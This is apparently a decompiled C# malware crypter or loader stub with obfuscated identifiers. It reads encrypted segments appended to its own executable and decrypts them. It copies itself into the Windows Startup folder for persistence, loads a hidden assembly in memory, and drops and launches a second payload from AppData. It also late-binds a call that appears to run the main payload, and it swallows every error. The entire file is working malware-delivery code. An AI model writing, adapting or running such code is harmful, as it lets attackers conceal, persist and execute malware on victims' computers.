using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace asnda7sd6na7dna7;

[StandardModule]
internal sealed class awsuyansdnb7asdn
{
	private static string[] g24234g23g2;

	private static void naewqwn837m28m2325()
	{
		try
		{
			g24234g23g2[1] = Class1.a76s67asn8212(g24234g23g2[1], "g2ge3443");
			byte[] bytes = Encoding.Default.GetBytes(g24234g23g2[1]);
			g24234g23g2[3] = Class1.a76s67asn8212(g24234g23g2[3], "4g42rte");
			g24234g23g2[3] = Class1.a76s67asn8212(g24234g23g2[3], "764i9iu8");
			byte[] bytes2 = Encoding.Default.GetBytes(g24234g23g2[3]);
			if (Operators.CompareString(g24234g23g2[4], "no", false) != 0)
			{
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			Assembly assembly = Assembly.Load(bytes2);
			Type type = assembly.GetType("ClassLibrary1.Class1", throwOnError: true);
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type, nonPublic: true));
			g24234g23g2[2] = Class1.a76s67asn8212(g24234g23g2[2], "356hhdat");
			byte[] bytes3 = Encoding.Default.GetBytes(g24234g23g2[2]);
			if (Operators.CompareString(g24234g23g2[2], "no", false) != 0)
			{
				try
				{
					File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + g24234g23g2[5], bytes3);
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + g24234g23g2[5]);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(Conversions.ToInteger(g24234g23g2[6]));
			object[] array = new object[2]
			{
				bytes,
				Process.GetCurrentProcess().MainModule!.FileName
			};
			bool[] array2 = new bool[2] { true, false };
			NewLateBinding.LateCall(objectValue, (Type)null, "annsda7n632", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				bytes = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			string text = File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
			g24234g23g2 = Strings.Split(text, "665tty555n738", -1, (CompareMethod)0);
			naewqwn837m28m2325();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
